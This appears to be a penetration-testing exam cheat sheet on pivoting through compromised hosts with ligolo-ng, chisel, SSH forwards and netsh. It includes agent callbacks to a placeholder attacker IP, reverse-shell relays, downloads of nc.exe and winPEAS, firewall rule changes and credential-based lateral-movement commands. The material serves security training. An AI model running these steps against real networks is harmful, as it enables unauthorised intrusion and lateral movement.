docs.title: Three kinds of pivot
docs.text: Kind What you get Tools Layer-3 tunnel A real route on Kali — every tool works unchanged ligolo-ng SOCKS proxy A proxy port; tools run through proxychains chisel, ssh -D Single port forward One remote port appears on Kali (or the reverse) ssh -L/-R, chisel R:, ligolo-ng listener

docs.title: 2. Main tools
docs.text:
Tool Use it for Exam status ligolo-ng Default choice: TUN interface, routes, listeners, double pivots Allowed chisel Fallback: reverse SOCKS and port forwards over HTTP Allowed ssh -L, -R, -D when you have SSH on a Linux pivot Allowed proxychains4 Run tools through a SOCKS proxy Allowed netsh portproxy / socat Quick single-port relays on Windows / Linux pivots Allowed

Exam rule — no Metasploit pivoting

Meterpreter autoroute, portfwd and the socks proxy module count as using Metasploit against more than one target — not allowed. Use the standalone tools on this page. See Metasploit limits.

docs.title: 3.1 ligolo-ng — route a whole subnet
docs.text:
Situation: You have a shell on MS01; ipconfig shows 10.10.120.0/24 on a second NIC.

1. One-time setup on Kali — create the tun interface:

sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

2. Start the proxy (listener) on Kali:

./proxy -selfcert          # lab/exam use; listens on 0.0.0.0:11601 by default

3. Run the agent on the compromised host, pointing back at Kali:

Linux targetWindows target 
./agent -connect <KALI_IP>:11601 -ignore-cert

.\agent.exe -connect <KALI_IP>:11601 -ignore-cert

-ignore-cert is for lab/exam use with -selfcert only.

4. In the proxy console, select the session and add the route to the internal subnet:

ligolo-ng » session
ligolo-ng » interface_add_route --name ligolo --route 10.10.120.0/24
ligolo-ng » tunnel_start --tun ligolo

Command names differ between versions

Older releases use start in the console and a manual route on Kali (sudo ip route add 10.10.120.0/24 dev ligolo). Type help in the proxy console to see your version's commands — and fix your cheat sheet to the version you'll take into the exam.

What to read: Agent joined in the proxy console; after tunnel_start, ip route on Kali shows 10.10.120.0/24 dev ligolo.

Next: scan and attack directly from Kali:

nxc smb 10.10.120.0/24 -u "$USER_" -p "$PASS"
nmap -sT -Pn --top-ports 200 10.10.120.142      # TCP connect only through a tunnel
evil-winrm -i 10.10.120.142 -u svc_sql -p 'Found_Pass1'

docs.title: 3.2 ligolo-ng — reverse shells and downloads from internal hosts
docs.text:
Situation: You exploit MS02 (internal) but its reverse shell can't reach Kali.

Add a listener on the agent that forwards a port back to your handler:

ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
ligolo-ng » listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp      # file server
ligolo-ng » listener_list

Point the payload at MS01's internal IP on :4444; it is relayed to nc -lvnp 4444 on Kali. Downloads: iwr http://<MS01_internal_IP>:8080/nc.exe ... reaches python3 -m http.server 80 on Kali.

Firewall on the pivot

A Windows pivot's firewall may block the inbound listener port. If MS02 can't connect, try a port that's already allowed, or (as admin) add a rule: netsh advfirewall firewall add rule name=l dir=in action=allow protocol=tcp localport=4444.

docs.title: 3.3 ligolo-ng — reach the agent's own localhost
docs.text:
To hit a service bound to 127.0.0.1 on the compromised host itself, Ligolo-ng maps the unused range 240.0.0.0/4 to the agent's loopback:

sudo ip route add 240.0.0.1/32 dev ligolo

Then target 240.0.0.1 — e.g. an internal admin panel on 127.0.0.1:8000 becomes http://240.0.0.1:8000.

docs.title: 3.4 Double pivot
docs.text:
Situation: MS02 has a NIC on a third subnet (172.16.10.0/24) that MS01 can't reach.

On the first agent, add a listener that relays the control channel back to your proxy:

ligolo-ng » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

Run a second agent on MS02 connecting to MS01's internal IP on that port. On Kali create a second interface (sudo ip tuntap add user $(whoami) mode tun ligolo2; sudo ip link set ligolo2 up), select the new session, and route 172.16.10.0/24 to ligolo2. Each hop relays the control channel back one step until it reaches Kali.

docs.title: 3.5 chisel — the fallback
docs.text:
Situation: ligolo-ng's agent is blocked or the architecture is odd.

# Kali (server)
./chisel server -p 8000 --reverse

# target (client) — reverse SOCKS back to Kali (Kali gets 127.0.0.1:1080)
.\chisel.exe client <KALI_IP>:8000 R:socks
# or forward just one port: internal 10.10.120.142:5985 → Kali 127.0.0.1:5985
.\chisel.exe client <KALI_IP>:8000 R:5985:10.10.120.142:5985

Add socks5 127.0.0.1 1080 to /etc/proxychains4.conf, then prefix tools with proxychains -q:

proxychains -q nxc smb 10.10.120.0/24 -u "$USER_" -p "$PASS"
proxychains -q impacket-psexec "$DOMAIN/admin:Pass@10.10.120.142"

What to read: session#1: Client version ... connected on the server. Timeouts through proxychains → use -sT -Pn for nmap, and keep port lists short.

docs.title: 3.6 SSH forwarding
docs.text:
Situation: You have SSH credentials or a key for a Linux pivot — no uploads needed.

Goal Command Effect Reach one internal port ssh -L 8080:10.10.120.142:80 user@pivot Kali localhost:8080 → internal :80 Reach the pivot's own localhost ssh -L 3306:127.0.0.1:3306 user@pivot Kali localhost:3306 → pivot's MySQL Expose a Kali port to the pivot ssh -R 4444:127.0.0.1:4444 user@pivot Pivot :4444 → Kali :4444 (reverse shells) Whole-subnet SOCKS ssh -D 1080 user@pivot SOCKS proxy on Kali :1080 → use with proxychains

Add -N -f to run in the background without a shell. Already inside an SSH session? Type ~C at the start of a line to add a forward on the fly.

docs.title: 3.7 Windows built-in port forward — netsh
docs.text:
Situation: You are admin on a Windows pivot and want a quick single-port relay without uploading anything.

netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8445 connectaddress=10.10.120.142 connectport=445
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8445    # clean-up

docs.title: 3.8 File transfer onto internal hosts
docs.text:
Once routed, serve files from Kali and pull them in:

python3 -m http.server 80           # on Kali

iwr http://<KALI_IP>/winPEAS.exe -OutFile C:\Windows\Temp\wp.exe   # on target (ligolo route)

With a ligolo-ng route the internal host can't route back to Kali by itself — use a listener on the agent, or an SMB server reachable through it (impacket-smbserver share . -smb2support). More → Shells & file transfer.

docs.title: 4. Common mistakes
docs.text:
• SYN / ping scans through a tunnel. Through SOCKS only full TCP connects work: nmap -sT -Pn. Ligolo-ng handles ICMP, but scans are still slower — use short port lists.
  • Forgetting the return path. Routes go Kali → internal; reverse shells from internal hosts need a listener / -R forward.
  • Overlapping routes — your tun0 VPN range and the internal range overlap, or a stale ligolo route remains from a previous session (ip route to check, sudo ip route del ...).
  • Pivot shell dies → tunnel dies. Run the agent as a separate process (Start-Process, nohup ... &) so it survives the shell.
  • Kerberos through the tunnel without names. Add internal hosts to /etc/hosts and use hostnames.

docs.title: 5. Exam tips
docs.text:
• Practise the ligolo-ng setup until it takes under two minutes, from memory, with the exact version you'll use.
  • Keep agents for both Windows (x64) and Linux in your tools folder.
  • Note the internal subnet, the pivot host and the forwards you used — the report must explain how you reached each internal machine.
